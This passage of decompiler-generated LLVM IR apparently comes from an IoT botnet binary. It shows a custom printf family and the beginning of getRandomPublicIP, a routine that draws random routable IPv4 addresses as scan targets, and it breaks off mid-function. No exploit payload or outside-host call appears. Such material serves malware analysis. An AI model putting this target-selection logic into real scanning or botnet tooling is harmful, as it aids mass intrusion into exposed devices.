  %v6_11ea4 = call i32 @prints(i32 %arg1, i8* %v5_11ea4, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_12014

dec_label_pc_11eb4:                               ; preds = %entry
  %v2_11eb8 = icmp eq i32 %arg4, 0
  br i1 %v2_11eb8, label %dec_label_pc_11eec, label %dec_label_pc_11ec0

dec_label_pc_11ec0:                               ; preds = %dec_label_pc_11eb4
  %v7_11ec4 = icmp eq i32 %arg3, 10
  br i1 %v7_11ec4, label %dec_label_pc_11ecc, label %dec_label_pc_11eec

dec_label_pc_11ecc:                               ; preds = %dec_label_pc_11ec0
  br i1 %v1_11e78, label %dec_label_pc_11ed8, label %dec_label_pc_11eec

dec_label_pc_11ed8:                               ; preds = %dec_label_pc_11ecc
  %v1_11ee4 = sub i32 0, %arg2
  br label %dec_label_pc_11eec

dec_label_pc_11eec:                               ; preds = %dec_label_pc_11ecc, %dec_label_pc_11ec0, %dec_label_pc_11eb4, %dec_label_pc_11ed8
  %stack_var_-52.0 = phi i32 [ %arg2, %dec_label_pc_11eb4 ], [ %v1_11ee4, %dec_label_pc_11ed8 ], [ %arg2, %dec_label_pc_11ecc ], [ %arg2, %dec_label_pc_11ec0 ]
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_11eb4 ], [ 1, %dec_label_pc_11ed8 ], [ 0, %dec_label_pc_11ecc ], [ 0, %dec_label_pc_11ec0 ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_11f804 = icmp eq i32 %stack_var_-52.0, 0
  br i1 %v2_11f804, label %dec_label_pc_11f88, label %dec_label_pc_11f08.lr.ph

dec_label_pc_11f08.lr.ph:                         ; preds = %dec_label_pc_11eec
  %v1_11f30 = add i32 %arg7, -58
  br label %dec_label_pc_11f08

dec_label_pc_11f08:                               ; preds = %dec_label_pc_11f08.lr.ph, %dec_label_pc_11f40
  %stack_var_-52.16 = phi i32 [ %stack_var_-52.0, %dec_label_pc_11f08.lr.ph ], [ %v2_11f14, %dec_label_pc_11f40 ]
  %stack_var_-68.05 = phi i8* [ %tmp26, %dec_label_pc_11f08.lr.ph ], [ %v5_11f48, %dec_label_pc_11f40 ]
  %v2_11f14 = udiv i32 %stack_var_-52.16, %arg3
  %v3_11f14 = urem i32 %stack_var_-52.16, %arg3
  %v7_11f28 = icmp slt i32 %v3_11f14, 10
  br i1 %v7_11f28, label %dec_label_pc_11f40, label %dec_label_pc_11f2c

dec_label_pc_11f2c:                               ; preds = %dec_label_pc_11f08
  %v2_11f38 = add i32 %v3_11f14, %v1_11f30
  br label %dec_label_pc_11f40

dec_label_pc_11f40:                               ; preds = %dec_label_pc_11f08, %dec_label_pc_11f2c
  %stack_var_-64.0 = phi i32 [ %v3_11f14, %dec_label_pc_11f08 ], [ %v2_11f38, %dec_label_pc_11f2c ]
  %v4_11f40 = ptrtoint i8* %stack_var_-68.05 to i32
  %v1_11f44 = add i32 %v4_11f40, -1
  %v5_11f48 = inttoptr i32 %v1_11f44 to i8*
  %fold = add i32 %stack_var_-64.0, 48
  %v1_11f60 = trunc i32 %fold to i8
  store i8 %v1_11f60, i8* %v5_11f48, align 1
  %v2_11f80 = icmp ult i32 %stack_var_-52.16, %arg3
  br i1 %v2_11f80, label %dec_label_pc_11f88, label %dec_label_pc_11f08

dec_label_pc_11f88:                               ; preds = %dec_label_pc_11f40, %dec_label_pc_11eec
  %stack_var_-68.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_11eec ], [ %v5_11f48, %dec_label_pc_11f40 ]
  %v2_11f8c = icmp eq i32 %stack_var_-60.0, 0
  br i1 %v2_11f8c, label %dec_label_pc_11ff0, label %dec_label_pc_11f94

dec_label_pc_11f94:                               ; preds = %dec_label_pc_11f88
  %v3_11f94 = load i32, i32* %stack_var_0, align 4
  %v2_11f98 = icmp eq i32 %v3_11f94, 0
  br i1 %v2_11f98, label %dec_label_pc_11fd8, label %dec_label_pc_11fa0

dec_label_pc_11fa0:                               ; preds = %dec_label_pc_11f94
  %v1_11fa4 = and i32 %arg6, 2
  %v2_11fa8 = icmp eq i32 %v1_11fa4, 0
  br i1 %v2_11fa8, label %dec_label_pc_11fd8, label %dec_label_pc_11fb0

dec_label_pc_11fb0:                               ; preds = %dec_label_pc_11fa0
  %v2_11fb8 = inttoptr i32 %arg1 to i32*
  %v3_11fb8 = call i32 @printchar(i32* %v2_11fb8, i32 45)
  %v3_11fc8 = load i32, i32* %stack_var_0, align 4
  %v1_11fcc = add i32 %v3_11fc8, -1
  store i32 %v1_11fcc, i32* %stack_var_0, align 4
  br label %dec_label_pc_11ff0

dec_label_pc_11fd8:                               ; preds = %dec_label_pc_11fa0, %dec_label_pc_11f94
  %v4_11fd8 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_11fdc = add i32 %v4_11fd8, -1
  %v5_11fe0 = inttoptr i32 %v1_11fdc to i8*
  store i8 45, i8* %v5_11fe0, align 1
  br label %dec_label_pc_11ff0

dec_label_pc_11ff0:                               ; preds = %dec_label_pc_11f88, %dec_label_pc_11fb0, %dec_label_pc_11fd8
  %stack_var_-68.1 = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_11f88 ], [ %v5_11fe0, %dec_label_pc_11fd8 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_11fb0 ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_11f88 ], [ 0, %dec_label_pc_11fd8 ], [ 1, %dec_label_pc_11fb0 ]
  %v3_11ff8 = load i32, i32* %stack_var_0, align 4
  %v6_12000 = call i32 @prints(i32 %arg1, i8* %stack_var_-68.1, i32 %v3_11ff8, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_1200c = add i32 %v6_12000, %stack_var_-56.0
  br label %dec_label_pc_12014

dec_label_pc_12014:                               ; preds = %dec_label_pc_11e80, %dec_label_pc_11ff0
  %storemerge2 = phi i32 [ %v2_1200c, %dec_label_pc_11ff0 ], [ %v6_11ea4, %dec_label_pc_11e80 ]
  store i32 %v3_11e40, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-68.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_11f48, { 0, 2, 1 }
  uselistorder i32 %v3_11f14, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12014, { 1, 0 }
  uselistorder label %dec_label_pc_11ff0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11f40, { 1, 0 }
  uselistorder label %dec_label_pc_11f08, { 1, 0 }
  uselistorder label %dec_label_pc_11eec, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 73780, i32* %stack_var_-4, align 4
  %v2_12030 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12030, i32* @fp, align 4
  %stack_var_-32.428 = inttoptr i32 %arg2 to i8*
  %v2_123dc29 = load i8, i8* %stack_var_-32.428, align 1
  %v2_123e031 = icmp eq i8 %v2_123dc29, 0
  br i1 %v2_123e031, label %dec_label_pc_123e8, label %dec_label_pc_12050.lr.ph

dec_label_pc_12050.lr.ph:                         ; preds = %entry
  %v5_12394 = bitcast i32* %stack_var_-18 to i8*
  br label %dec_label_pc_12050

dec_label_pc_12050:                               ; preds = %dec_label_pc_12050.lr.ph, %dec_label_pc_123cc
  %stack_var_-32.435 = phi i8* [ %stack_var_-32.428, %dec_label_pc_12050.lr.ph ], [ %stack_var_-32.4, %dec_label_pc_123cc ]
  %stack_var_-32.4.in34 = phi i32 [ %arg2, %dec_label_pc_12050.lr.ph ], [ %v1_123d0, %dec_label_pc_123cc ]
  %stack_var_-36.133 = phi i32 [ %arg3, %dec_label_pc_12050.lr.ph ], [ %stack_var_-36.0, %dec_label_pc_123cc ]
  %stack_var_-44.132 = phi i32 [ 0, %dec_label_pc_12050.lr.ph ], [ %stack_var_-44.0, %dec_label_pc_123cc ]
  %v2_12054 = load i8, i8* %stack_var_-32.435, align 1
  %v7_12058 = icmp eq i8 %v2_12054, 37
  br i1 %v7_12058, label %dec_label_pc_12060, label %dec_label_pc_123ac

dec_label_pc_12060:                               ; preds = %dec_label_pc_12050
  %v1_12064 = add i32 %stack_var_-32.4.in34, 1
  %v5_12068 = inttoptr i32 %v1_12064 to i8*
  %v2_12080 = load i8, i8* %v5_12068, align 1
  %v2_12084 = icmp eq i8 %v2_12080, 0
  br i1 %v2_12084, label %dec_label_pc_123e8, label %dec_label_pc_1208c

dec_label_pc_1208c:                               ; preds = %dec_label_pc_12060
  %v2_12090 = load i8, i8* %v5_12068, align 1
  %v7_12094 = icmp eq i8 %v2_12090, 37
  br i1 %v7_12094, label %dec_label_pc_123ac, label %dec_label_pc_1209c

dec_label_pc_1209c:                               ; preds = %dec_label_pc_1208c
  %v2_120a0 = load i8, i8* %v5_12068, align 1
  %v7_120a4 = icmp eq i8 %v2_120a0, 45
  br i1 %v7_120a4, label %dec_label_pc_120ac, label %dec_label_pc_120dc.preheader

dec_label_pc_120ac:                               ; preds = %dec_label_pc_1209c
  %v1_120b0 = add i32 %stack_var_-32.4.in34, 2
  %v5_120b4 = inttoptr i32 %v1_120b0 to i8*
  br label %dec_label_pc_120dc.preheader

dec_label_pc_120dc.preheader:                     ; preds = %dec_label_pc_120ac, %dec_label_pc_1209c
  %stack_var_-32.0.ph = phi i8* [ %v5_12068, %dec_label_pc_1209c ], [ %v5_120b4, %dec_label_pc_120ac ]
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_1209c ], [ 1, %dec_label_pc_120ac ]
  %v4_120dc2 = ptrtoint i8* %stack_var_-32.0.ph to i32
  %v2_120e03 = load i8, i8* %stack_var_-32.0.ph, align 1
  %v7_120e47 = icmp eq i8 %v2_120e03, 48
  br i1 %v7_120e47, label %dec_label_pc_120c4, label %dec_label_pc_12128.preheader

dec_label_pc_120c4:                               ; preds = %dec_label_pc_120dc.preheader, %dec_label_pc_120c4
  %v4_120dc9 = phi i32 [ %v1_120c8, %dec_label_pc_120c4 ], [ %v4_120dc2, %dec_label_pc_120dc.preheader ]
  %stack_var_-48.08 = phi i32 [ %v1_120d4, %dec_label_pc_120c4 ], [ %stack_var_-48.0.ph, %dec_label_pc_120dc.preheader ]
  %v1_120c8 = add i32 %v4_120dc9, 1
  %v5_120cc = inttoptr i32 %v1_120c8 to i8*
  %v1_120d4 = or i32 %stack_var_-48.08, 2
  %v2_120e0 = load i8, i8* %v5_120cc, align 1
  %v7_120e4 = icmp eq i8 %v2_120e0, 48
  br i1 %v7_120e4, label %dec_label_pc_120c4, label %dec_label_pc_12128.preheader

dec_label_pc_12128.preheader:                     ; preds = %dec_label_pc_120c4, %dec_label_pc_120dc.preheader
  %stack_var_-48.0.lcssa = phi i32 [ %stack_var_-48.0.ph, %dec_label_pc_120dc.preheader ], [ %v1_120d4, %dec_label_pc_120c4 ]
  %stack_var_-32.0.lcssa = phi i8* [ %stack_var_-32.0.ph, %dec_label_pc_120dc.preheader ], [ %v5_120cc, %dec_label_pc_120c4 ]
  %v4_1212811 = ptrtoint i8* %stack_var_-32.0.lcssa to i32
  %v2_1212c12 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_1212c12, 48
  br i1 %tmp60, label %dec_label_pc_12148, label %dec_label_pc_12138

dec_label_pc_120f0:                               ; preds = %dec_label_pc_12138
  %v2_120fc = mul i32 %stack_var_-52.019, 10
  %v2_12108 = load i8, i8* %stack_var_-32.120, align 1
  %v3_12108 = zext i8 %v2_12108 to i32
  %v1_1210c = add i32 %v2_120fc, -48
  %v2_12114 = add i32 %v1_1210c, %v3_12108
  %v1_12120 = add i32 %v4_1212821, 1
  %v5_12124 = inttoptr i32 %v1_12120 to i8*
  %v2_1212c = load i8, i8* %v5_12124, align 1
  %tmp61 = icmp ult i8 %v2_1212c, 48
  br i1 %tmp61, label %dec_label_pc_12148, label %dec_label_pc_12138

dec_label_pc_12138:                               ; preds = %dec_label_pc_12128.preheader, %dec_label_pc_120f0
  %v4_1212821 = phi i32 [ %v1_12120, %dec_label_pc_120f0 ], [ %v4_1212811, %dec_label_pc_12128.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_12124, %dec_label_pc_120f0 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_12128.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_12114, %dec_label_pc_120f0 ], [ 0, %dec_label_pc_12128.preheader ]
  %v2_1213c = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_1213c, 58
  br i1 %tmp62, label %dec_label_pc_120f0, label %dec_label_pc_12148

dec_label_pc_12148:                               ; preds = %dec_label_pc_120f0, %dec_label_pc_12138, %dec_label_pc_12128.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_12128.preheader ], [ %v2_12114, %dec_label_pc_120f0 ], [ %stack_var_-52.019, %dec_label_pc_12138 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_12128.preheader ], [ %v5_12124, %dec_label_pc_120f0 ], [ %stack_var_-32.120, %dec_label_pc_12138 ]
  %v2_1214c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_12150 = icmp eq i8 %v2_1214c, 115
  br i1 %v7_12150, label %dec_label_pc_12158, label %dec_label_pc_121bc

dec_label_pc_12158:                               ; preds = %dec_label_pc_12148
  %v1_1215c = add i32 %stack_var_-36.133, 4
  %v1_12168 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_12168 = load i32, i32* %v1_12168, align 4
  %v2_12174 = icmp eq i32 %v2_12168, 0
  br i1 %v2_12174, label %dec_label_pc_12188, label %dec_label_pc_1217c

dec_label_pc_1217c:                               ; preds = %dec_label_pc_12158
  %v5_12180 = inttoptr i32 %v2_12168 to i8*
  br label %dec_label_pc_12190

dec_label_pc_12188:                               ; preds = %dec_label_pc_12158
  br label %dec_label_pc_12190

dec_label_pc_12190:                               ; preds = %dec_label_pc_1217c, %dec_label_pc_12188
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_383b0.579, i32 0, i32 0), %dec_label_pc_12188 ], [ %v5_12180, %dec_label_pc_1217c ]
  %v7_121a4 = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_121b0 = add i32 %v7_121a4, %stack_var_-44.132
  br label %dec_label_pc_123cc

dec_label_pc_121bc:                               ; preds = %dec_label_pc_12148
  %v2_121c0 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_121c4 = icmp eq i8 %v2_121c0, 100
  br i1 %v7_121c4, label %dec_label_pc_121cc, label %dec_label_pc_12220

dec_label_pc_121cc:                               ; preds = %dec_label_pc_121bc
  %v1_121d0 = add i32 %stack_var_-36.133, 4
  %v1_121dc = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_121dc = load i32, i32* %v1_121dc, align 4
  %v7_12208 = call i32 @printi(i32 %tmp, i32 %v2_121dc, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_12214 = add i32 %v7_12208, %stack_var_-44.132
  br label %dec_label_pc_123cc

dec_label_pc_12220:                               ; preds = %dec_label_pc_121bc
  %v2_12224 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_12228 = icmp eq i8 %v2_12224, 120
  br i1 %v7_12228, label %dec_label_pc_12230, label %dec_label_pc_12284

dec_label_pc_12230:                               ; preds = %dec_label_pc_12220
  %v1_12234 = add i32 %stack_var_-36.133, 4
  %v1_12240 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_12240 = load i32, i32* %v1_12240, align 4
  %v7_1226c = call i32 @printi(i32 %tmp, i32 %v2_12240, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_12278 = add i32 %v7_1226c, %stack_var_-44.132
  br label %dec_label_pc_123cc

dec_label_pc_12284:                               ; preds = %dec_label_pc_12220
  %v2_12288 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_1228c = icmp eq i8 %v2_12288, 88
  br i1 %v7_1228c, label %dec_label_pc_12294, label %dec_label_pc_122e8

dec_label_pc_12294:                               ; preds = %dec_label_pc_12284
  %v1_12298 = add i32 %stack_var_-36.133, 4
  %v1_122a4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_122a4 = load i32, i32* %v1_122a4, align 4
  %v7_122d0 = call i32 @printi(i32 %tmp, i32 %v2_122a4, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_122dc = add i32 %v7_122d0, %stack_var_-44.132
  br label %dec_label_pc_123cc

dec_label_pc_122e8:                               ; preds = %dec_label_pc_12284
  %v2_122ec = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_122f0 = icmp eq i8 %v2_122ec, 117
  br i1 %v7_122f0, label %dec_label_pc_122f8, label %dec_label_pc_1234c

dec_label_pc_122f8:                               ; preds = %dec_label_pc_122e8
  %v1_122fc = add i32 %stack_var_-36.133, 4
  %v1_12308 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_12308 = load i32, i32* %v1_12308, align 4
  %v7_12334 = call i32 @printi(i32 %tmp, i32 %v2_12308, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_12340 = add i32 %v7_12334, %stack_var_-44.132
  br label %dec_label_pc_123cc

dec_label_pc_1234c:                               ; preds = %dec_label_pc_122e8
  %v2_12350 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_12354 = icmp eq i8 %v2_12350, 99
  br i1 %v7_12354, label %dec_label_pc_1235c, label %dec_label_pc_123cc

dec_label_pc_1235c:                               ; preds = %dec_label_pc_1234c
  %v1_12360 = add i32 %stack_var_-36.133, 4
  %v1_1236c = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_1236c = load i32, i32* %v1_1236c, align 4
  %v1_12370 = urem i32 %v2_1236c, 256
  store i32 %v1_12370, i32* %stack_var_-18, align 4
  %v6_12394 = call i32 @prints(i32 %tmp, i8* %v5_12394, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_12360)
  %v2_123a0 = add i32 %v6_12394, %stack_var_-44.132
  br label %dec_label_pc_123cc

dec_label_pc_123ac:                               ; preds = %dec_label_pc_12050, %dec_label_pc_1208c
  %stack_var_-32.2 = phi i8* [ %v5_12068, %dec_label_pc_1208c ], [ %stack_var_-32.435, %dec_label_pc_12050 ]
  %v2_123b0 = load i8, i8* %stack_var_-32.2, align 1
  %v3_123b0 = zext i8 %v2_123b0 to i32
  %v3_123bc = call i32 @printchar(i32* %arg1, i32 %v3_123b0)
  %v1_123c4 = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_123cc

dec_label_pc_123cc:                               ; preds = %dec_label_pc_1234c, %dec_label_pc_1235c, %dec_label_pc_122f8, %dec_label_pc_12294, %dec_label_pc_12230, %dec_label_pc_121cc, %dec_label_pc_12190, %dec_label_pc_123ac
  %stack_var_-44.0 = phi i32 [ %v1_123c4, %dec_label_pc_123ac ], [ %v2_121b0, %dec_label_pc_12190 ], [ %v2_12214, %dec_label_pc_121cc ], [ %v2_12278, %dec_label_pc_12230 ], [ %v2_122dc, %dec_label_pc_12294 ], [ %v2_12340, %dec_label_pc_122f8 ], [ %v2_123a0, %dec_label_pc_1235c ], [ %stack_var_-44.132, %dec_label_pc_1234c ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_123ac ], [ %v1_1215c, %dec_label_pc_12190 ], [ %v1_121d0, %dec_label_pc_121cc ], [ %v1_12234, %dec_label_pc_12230 ], [ %v1_12298, %dec_label_pc_12294 ], [ %v1_122fc, %dec_label_pc_122f8 ], [ %v1_12360, %dec_label_pc_1235c ], [ %stack_var_-36.133, %dec_label_pc_1234c ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_123ac ], [ %stack_var_-32.1.lcssa, %dec_label_pc_12190 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_121cc ], [ %stack_var_-32.1.lcssa, %dec_label_pc_12230 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_12294 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_122f8 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_1235c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_1234c ]
  %v4_123cc = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_123d0 = add i32 %v4_123cc, 1
  %stack_var_-32.4 = inttoptr i32 %v1_123d0 to i8*
  %v2_123dc = load i8, i8* %stack_var_-32.4, align 1
  %v2_123e0 = icmp eq i8 %v2_123dc, 0
  br i1 %v2_123e0, label %dec_label_pc_123e8, label %dec_label_pc_12050

dec_label_pc_123e8:                               ; preds = %dec_label_pc_12060, %dec_label_pc_123cc, %entry
  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_12060 ], [ %stack_var_-44.0, %dec_label_pc_123cc ]
  %v2_123ec = icmp eq i32* %arg1, null
  br i1 %v2_123ec, label %dec_label_pc_12404, label %dec_label_pc_123f4

dec_label_pc_123f4:                               ; preds = %dec_label_pc_123e8
  %v2_123f8 = load i32, i32* %arg1, align 4
  %v3_12400 = inttoptr i32 %v2_123f8 to i8*
  store i8 0, i8* %v3_12400, align 1
  br label %dec_label_pc_12404

dec_label_pc_12404:                               ; preds = %dec_label_pc_123e8, %dec_label_pc_123f4
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_120c8, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_12068, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_12404, { 1, 0 }
  uselistorder label %dec_label_pc_123e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123cc, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_123ac, { 1, 0 }
  uselistorder label %dec_label_pc_12190, { 1, 0 }
  uselistorder label %dec_label_pc_12148, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12138, { 1, 0 }
  uselistorder label %dec_label_pc_120c4, { 1, 0 }
  uselistorder label %dec_label_pc_12050, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_1241c = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_12424 = load i32, i32* @fp, align 4
  %v10_12424 = load i32, i32* @lr, align 4
  store i32 74796, i32* %stack_var_-16, align 4
  %v2_12428 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_12428, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_12434 = ptrtoint i32* %stack_var_-8 to i32
  %v2_12440 = ptrtoint i32* %stack_var_-44 to i32
  %v14_1244c = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_12434, i32 %v2_12440, i32 %arg1, i32 %v2_12434, i32 %v3_12424, i32 %v1_1241c, i32 %v10_12424, i32 74796, i32 %arg2, i32 %arg3, i32 %arg4)
  ret i32 %v14_1244c

; uselistorder directives
  uselistorder i32 %v2_12434, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @getRandomPublicIP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_12468 = load i32, i32* @r4, align 4
  %v6_12468 = load i32, i32* @fp, align 4
  %v13_12468 = load i32, i32* @lr, align 4
  store i32 74864, i32* %stack_var_-4, align 4
  %v2_1246c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1246c, i32* @fp, align 4
  %v0_1247c = call i32 @rand()
  %v2_12498 = sdiv i32 %v0_1247c, 49
  %tmp41 = mul i32 %v2_12498, -224
  %v2_124b0 = add i32 %tmp41, %v0_1247c
  %v6_124c0 = trunc i32 %v2_124b0 to i8
  %v0_124c4 = call i32 @rand()
  %v2_124e0 = sdiv i32 %v0_124c4, 51
  %tmp42 = mul i32 %v2_124e0, -255
  %v2_124f8 = add i32 %tmp42, %v0_124c4
  %v1_12508 = trunc i32 %v2_124f8 to i8
  %v0_1250c = call i32 @rand()
  %v2_12528 = sdiv i32 %v0_1250c, 51
  %tmp43 = mul i32 %v2_12528, -255
  %v2_12540 = add i32 %tmp43, %v0_1250c
  %v1_12550 = trunc i32 %v2_12540 to i8
  %v0_12554 = call i32 @rand()
  %v2_12570 = sdiv i32 %v0_12554, 51
  %tmp = mul i32 %v2_12570, -255
  %v2_12588 = add i32 %v0_12554, %tmp
  br label %dec_label_pc_126c0

dec_label_pc_125a0:                               ; preds = %dec_label_pc_126f0, %dec_label_pc_1286c, %dec_label_pc_12824, %dec_label_pc_12704, %dec_label_pc_126cc, %dec_label_pc_126c0
  %v0_125a0 = call i32 @rand()
  %v2_125bc = sdiv i32 %v0_125a0, 49
  %tmp44 = mul i32 %v2_125bc, -224
  %v2_125d4 = add i32 %tmp44, %v0_125a0
  %v6_125e4 = trunc i32 %v2_125d4 to i8
  %v0_125e8 = call i32 @rand()
  %v2_12604 = sdiv i32 %v0_125e8, 51
  %tmp45 = mul i32 %v2_12604, -255
  %v2_1261c = add i32 %tmp45, %v0_125e8
  %v1_1262c = trunc i32 %v2_1261c to i8
  %v0_12630 = call i32 @rand()
  %v2_1264c = sdiv i32 %v0_12630, 51
  %tmp46 = mul i32 %v2_1264c, -255
  %v2_12664 = add i32 %tmp46, %v0_12630
  %v1_12674 = trunc i32 %v2_12664 to i8
  %v0_12678 = call i32 @rand()
  %v2_12694 = sdiv i32 %v0_12678, 51
  %tmp47 = mul i32 %v2_12694, -255
  %v2_126ac = add i32 %v0_12678, %tmp47
  br label %dec_label_pc_126c0

dec_label_pc_126c0:                               ; preds = %entry, %dec_label_pc_125a0
  %storemerge = phi i32 [ %v2_12588, %entry ], [ %v2_126ac, %dec_label_pc_125a0 ]
  %stack_var_-26.0 = phi i8 [ %v1_12550, %entry ], [ %v1_12674, %dec_label_pc_125a0 ]
  %stack_var_-27.0 = phi i8 [ %v1_12508, %entry ], [ %v1_1262c, %dec_label_pc_125a0 ]
  %stack_var_-28.0 = phi i8 [ %v6_124c0, %entry ], [ %v6_125e4, %dec_label_pc_125a0 ]
  %v4_126c0 = sext i8 %stack_var_-28.0 to i32
  %v2_126c4 = icmp eq i8 %stack_var_-28.0, 0
  br i1 %v2_126c4, label %dec_label_pc_125a0, label %dec_label_pc_126cc

dec_label_pc_126cc:                               ; preds = %dec_label_pc_126c0
  %v7_126d0 = icmp eq i8 %stack_var_-28.0, 10
  br i1 %v7_126d0, label %dec_label_pc_125a0, label %dec_label_pc_126d8

dec_label_pc_126d8:                               ; preds = %dec_label_pc_126cc
  %v7_126dc = icmp eq i8 %stack_var_-28.0, 100
  br i1 %v7_126dc, label %dec_label_pc_126e4, label %dec_label_pc_12704

dec_label_pc_126e4:                               ; preds = %dec_label_pc_126d8
  %tmp48 = icmp ult i8 %stack_var_-27.0, 64
  br i1 %tmp48, label %dec_label_pc_12704, label %dec_label_pc_126f0

